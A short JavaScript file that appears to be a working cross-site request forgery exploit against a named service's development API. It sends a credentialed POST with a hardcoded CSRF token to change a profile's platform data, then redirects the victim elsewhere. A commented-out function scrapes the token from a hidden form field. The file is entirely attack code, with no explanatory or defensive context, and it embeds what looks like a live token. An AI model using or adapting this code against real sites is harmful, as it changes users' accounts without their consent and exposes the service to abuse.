var payload = {
    "name": "ananuneninamu.com",
    "url": "annaninninamu.com",
    "audience_total": 3
};
var token = 'OzHthH9Lsxjyx1jQv3HCoFwv3jqdQkYwucXLnzjQwjWadqde6wjt9LcpKyqi4Kc5';
/*function getcsrf(){
    var url = 'https://dev.primetag.com/'
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            var div = document.createElement('div');
            div.innerHTML = xhr.responseText;
            document.body.appendChild(div);
            token = document.querySelectorAll('[type="hidden"]')[1].value;
        };
    };
    xhr.open('GET', url, true);
    xhr.send(null);
}*/
function postdata() {
    var url = 'https://dev.primetag.com/api/profiles/1150/platforms/4';
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            console.log(xhr.responseText);
            window.location = 'https://dnsleaktest.com';
        };
    };
    xhr.open('POST', url, true);
    xhr.setRequestHeader('X-CSRFToken', token);
    xhr.withCredentials = "true";
    xhr.send(JSON.stringify(payload));
};
//getcsrf();
postdata();
